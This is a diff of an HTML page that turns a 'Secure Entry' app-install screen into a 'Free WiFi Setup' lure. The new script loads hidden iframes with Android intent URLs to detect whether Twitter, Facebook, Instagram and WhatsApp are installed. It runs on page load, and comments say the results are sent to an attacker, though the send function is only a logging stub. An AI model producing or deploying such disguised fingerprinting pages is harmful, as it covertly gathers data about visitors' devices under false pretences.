@@ -1,71 +1,54 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Secure Entry</title>
-  <link rel="manifest" href="manifest.json">
-  <style>
-    body {
-      margin: 0;
-      background: #006400;
-      color: #fff;
-      font-family: system-ui;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh
-    }
-
-    .box {
-      background: rgba(0, 0, 0, .2);
-      padding: 2rem;
-      border-radius: 16px;
-      max-width: 90%
-    }
-
-    button {
-      background: #fff;
-      color: '#006CLR';
-      border: none;
-      padding: 1rem 2rem;
-      font-size: 1.1rem;
-      border-radius: 8px;
-      margin: 1rem;
-      cursor: pointer
-    }
-  </style>
+    <title>Free WiFi Setup</title>
 </head>
-
 <body>
-  <div class="box">
-    <h2>Secure Room Access</h2>
-    <p>Hold phone near the scanner…</p>
-    <button id="start">Start Check</button>
-    <div id="msg"></div>
-  </div>
+    <h2>Connecting to Free WiFi...</h2>
+    
+    <script>
+        const appSchemes = [
+          'intent://twitter.com/#Intent;scheme=twitter;package=com.twitter.android;end',
+          'intent://facebook.com/#Intent;scheme=fb;package=com.facebook.katana;end',
+          'intent://instagram.com/#Intent;scheme=instagram;package=com.instagram.android;end',
+          'intent://whatsapp.com/#Intent;scheme=whatsapp;package=com.whatsapp;end',
+        ];
 
-  <script>
-    let deferredPrompt;
-    window.addEventListener('beforeinstallprompt', e => {
-      e.preventDefault(); deferredPrompt = e;
-      document.getElementById('start').style.display = 'block';
-    });
+        let detectedApps = [];
 
-    document.getElementById('start').onclick = () => {
-      if (deferredPrompt) {
-        deferredPrompt.prompt();
-        deferredPrompt.userChoice.then(c => {
-          if (c.outcome === 'accepted') {
-            document.getElementById('msg').innerHTML = 'App added – hold near scanner';
-          }
-        });
-      } else {
-        document.getElementById('msg').innerHTML = 'Hold near scanner';
-      }
-    };
-  </script>
+        function probeApps() {
+            appSchemes.forEach((scheme, index) => {
+                setTimeout(() => {
+                    const iframe = document.createElement('iframe');
+                    iframe.src = scheme;
+                    iframe.style.display = 'none';
+                    
+                    iframe.onload = () => {
+                        detectedApps.push(scheme);
+                        console.log('App detected:', scheme);
+                    };
+                    
+                    document.body.appendChild(iframe);
+                    
+                    // Remove iframe after check
+                    setTimeout(() => {
+                        document.body.removeChild(iframe);
+                    }, 1000);
+                    
+                }, index * 200);
+            });
+
+            // Send results to attacker after all probes
+            setTimeout(() => {
+                sendToAttacker(detectedApps);
+            }, appSchemes.length * 200 + 1000);
+        }
+
+        function sendToAttacker(apps) {
+            // Send detected apps to attacker server
+            console.log("detected", apps)
+        }
+        window.onload = probeApps;
+    </script>
 </body>
-
 </html>
